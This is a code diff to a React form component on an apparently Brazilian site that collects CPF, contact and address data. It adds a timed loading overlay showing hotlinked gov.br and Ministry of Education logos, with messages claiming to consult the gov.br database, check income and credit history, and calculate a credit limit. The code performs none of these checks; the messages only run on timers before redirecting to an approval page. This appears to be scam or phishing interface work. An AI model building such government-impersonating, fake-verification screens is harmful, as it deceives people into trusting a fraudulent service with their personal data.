@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { useUser } from "../context/UserContext";
 
@@ -599,6 +599,37 @@ export default function FormularioSolicitacao({ respostasQuiz }) {
   const navigate = useNavigate();
 
   const [dadosCPF, setDadosCPF] = useState(null);
+  const [showAprovacaoTransition, setShowAprovacaoTransition] = useState(false);
+  const [loadingTextIdx, setLoadingTextIdx] = useState(0);
+  const [textVisible, setTextVisible] = useState(true);
+  const navigateRef = useRef(navigate);
+  useEffect(() => { navigateRef.current = navigate; });
+
+  const LOADING_TEXTS = [
+    (nome: string) => `Confirmando elegibilidade de ${nome} no programa`,
+    ()             => `Consultando a base de dados do gov.br...`,
+    ()             => `Verificando renda familiar declarada...`,
+    ()             => `Analisando localização e área urbana...`,
+    ()             => `Calculando limite de crédito disponível...`,
+    ()             => `Confirmando dados do imóvel informado...`,
+    ()             => `Validando histórico de crédito...`,
+    ()             => `Finalizando análise e preparando proposta...`,
+  ];
+
+  useEffect(() => {
+    if (!showAprovacaoTransition) return;
+    const INTERVAL = 1700;
+    let idx = 0;
+    const cycle = setInterval(() => {
+      setTextVisible(false);
+      setTimeout(() => {
+        idx = (idx + 1) % LOADING_TEXTS.length;
+        setLoadingTextIdx(idx);
+        setTextVisible(true);
+      }, 350);
+    }, INTERVAL);
+    return () => clearInterval(cycle);
+  }, [showAprovacaoTransition]);
   const [form, setForm]         = useState({ email: "", telefone: "", tipoImovel: "", escritura: "" });
   const [end, setEnd]           = useState({ cep: "", logradouro: "", numero: "", complemento: "", bairro: "", cidade: "", uf: "", referencia: "" });
   const [aceite, setAceite]     = useState(false);
@@ -642,7 +673,8 @@ export default function FormularioSolicitacao({ respostasQuiz }) {
     setEnviando(true);
     setTimeout(() => {
       setEnviando(false);
-      navigate("/aprovacao");
+      setShowAprovacaoTransition(true);
+      setTimeout(() => navigateRef.current("/aprovacao"), 14000);
     }, 1800);
   };
 
@@ -652,8 +684,57 @@ export default function FormularioSolicitacao({ respostasQuiz }) {
     setAceite(false); setErros({}); setProtocolo(null); setEtapaAtual(2);
   };
 
+  const primeiroNome = dadosCPF?.nome
+    ? dadosCPF.nome.split(" ")[0].charAt(0).toUpperCase() + dadosCPF.nome.split(" ")[0].slice(1).toLowerCase()
+    : "você";
+
   return (
     <div style={{ fontFamily: "'Segoe UI', Arial, sans-serif", background: C.cinzaFundo, minHeight: "100vh", color: C.texto }}>
+
+      {/* ── Transition overlay: /formulario → /aprovacao ─────────────────── */}
+      {showAprovacaoTransition && (
+        <div className="fixed inset-0 z-50 bg-white flex items-center justify-center">
+          <div className="w-full max-w-md mx-auto px-6 text-center">
+            <img
+              src="https://www.gov.br/cidades/pt-br/++theme++padrao_govbr/img/logo-mec-governo.png"
+              alt="Ministério da Educação - Governo Federal"
+              className="h-12 mx-auto mb-10"
+              onError={(e) => {
+                (e.target as HTMLImageElement).src =
+                  "https://sso.acesso.gov.br/assets/govbr/img/govbr.png";
+              }}
+            />
+            <div className="transition-all duration-500 ease-out">
+              <div className="min-h-[80px] flex flex-col items-center justify-center mb-8">
+                <p
+                  className="text-lg text-gray-700 font-normal text-center leading-relaxed"
+                  style={{
+                    opacity: textVisible ? 1 : 0,
+                    transform: textVisible ? "translateY(0)" : "translateY(8px)",
+                    transition: "opacity 0.35s ease, transform 0.35s ease",
+                  }}
+                >
+                  {LOADING_TEXTS[loadingTextIdx](primeiroNome)}
+                </p>
+              </div>
+              <div className="flex justify-center mt-8 gap-2">
+                {[0, 150, 300].map((delay) => (
+                  <div
+                    key={delay}
+                    className="w-2 h-2 bg-[#1351B4] rounded-full animate-bounce"
+                    style={{ animationDelay: `${delay}ms`, animationDuration: "0.8s" }}
+                  />
+                ))}
+              </div>
+              <p className="text-[11px] text-gray-400 mt-10 transition-opacity duration-300">
+                Verificando oportunidades compatíveis com seu perfil...
+              </p>
+            </div>
+          </div>
+          <style>{`@keyframes fadeInUp { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }`}</style>
+        </div>
+      )}
+
       <style>{`
         @keyframes entrar { from { opacity:0; transform:translateY(12px); } to { opacity:1; transform:translateY(0); } }
         * { box-sizing: border-box; margin: 0; padding: 0; }
